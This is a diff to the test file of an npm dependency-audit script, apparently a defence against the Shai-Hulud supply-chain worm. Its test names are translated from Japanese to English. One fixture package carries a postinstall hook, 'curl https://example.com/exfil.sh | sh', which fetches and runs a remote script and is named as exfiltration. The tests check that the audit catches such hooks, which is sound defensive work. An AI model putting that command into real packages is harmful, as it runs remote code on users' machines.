@@ -33,7 +33,7 @@ describe("audit-dependencies (ADR mini Shai-Hulud 2nd 対策)", () => {
     );
   }
 
-  it("baseline が無いと ok=false / mode='baseline-missing' を返すべき", () => {
+  it("should return ok=false / mode='baseline-missing' when the baseline is missing", () => {
     writePackage("safe-pkg", { scripts: { test: "noop" } });
     // BASELINE_PATH は scripts/audit-baseline.json で固定。 ここでは production baseline を
     // 触らない (= production node_modules vs production baseline は別 test で見る) ので、
@@ -45,7 +45,7 @@ describe("audit-dependencies (ADR mini Shai-Hulud 2nd 対策)", () => {
     expect(["baseline-missing", "diff"]).toContain(outcome.mode);
   });
 
-  it("install-time lifecycle script (postinstall) を持つ package を発見すべき", () => {
+  it("should discover packages with install-time lifecycle scripts (postinstall)", () => {
     writePackage("malicious-pkg", {
       scripts: { postinstall: "curl https://example.com/exfil.sh | sh" },
     });
@@ -60,7 +60,7 @@ describe("audit-dependencies (ADR mini Shai-Hulud 2nd 対策)", () => {
     expect(addedNames).toContain("malicious-pkg");
   });
 
-  it("publish-time のみ実行される prepublish / prepublishOnly は監査対象外であるべき", () => {
+  it("publish-time-only prepublish / prepublishOnly should be out of audit scope", () => {
     writePackage("publish-only-pkg", {
       scripts: { prepublish: "yarn build", prepublishOnly: "yarn test" },
     });
@@ -72,7 +72,7 @@ describe("audit-dependencies (ADR mini Shai-Hulud 2nd 対策)", () => {
     expect(addedNames).not.toContain("publish-only-pkg");
   });
 
-  it("script が無い package は監査対象外であるべき", () => {
+  it("packages without scripts should be out of audit scope", () => {
     writePackage("no-scripts-pkg", {});
     writePackage("empty-scripts-pkg", { scripts: {} });
     const outcome = runAudit({ nodeModulesPath: join(tmpRoot, "node_modules") });
@@ -82,7 +82,7 @@ describe("audit-dependencies (ADR mini Shai-Hulud 2nd 対策)", () => {
     expect(addedNames).not.toContain("empty-scripts-pkg");
   });
 
-  it("scoped package (@scope/pkg) の lifecycle script も discover すべき", () => {
+  it("should also discover lifecycle scripts in scoped packages (@scope/pkg)", () => {
     writePackage("@evil/scoped-pkg", {
       scripts: { preinstall: "echo pwned" },
     });
@@ -92,7 +92,7 @@ describe("audit-dependencies (ADR mini Shai-Hulud 2nd 対策)", () => {
     expect(addedNames).toContain("@evil/scoped-pkg");
   });
 
-  it("壊れた node_modules entry (= broken symlink 等) は無視すべき", () => {
+  it("should ignore broken node_modules entries (broken symlinks etc.)", () => {
     // 存在しない dir を nodeModulesPath に渡しても crash せず空 result を返す。
     const outcome = runAudit({
       nodeModulesPath: join(tmpRoot, "does-not-exist"),
@@ -105,7 +105,7 @@ describe("audit-dependencies (ADR mini Shai-Hulud 2nd 対策)", () => {
 
   // production baseline が現状とずれていないことの整合性 check は別途
   // `make audit-deps` を実行する。 ここでは unit pin に絞る。
-  it("baseline 不在を skip 不可: production node_modules でも mode は決定論的に返るべき", () => {
+  it("should never skip on missing baseline: mode should be returned deterministically even on production node_modules", () => {
     // production node_modules を fake に置き換えずに呼ぶケース (= baseline がある + 現状一致)。
     // 期待: 別途実行される `bun run scripts/audit-dependencies.ts` で ok=true になっていることが
     // 整合の証拠。 本 test は呼び出し interface が落ちないことだけ pin。
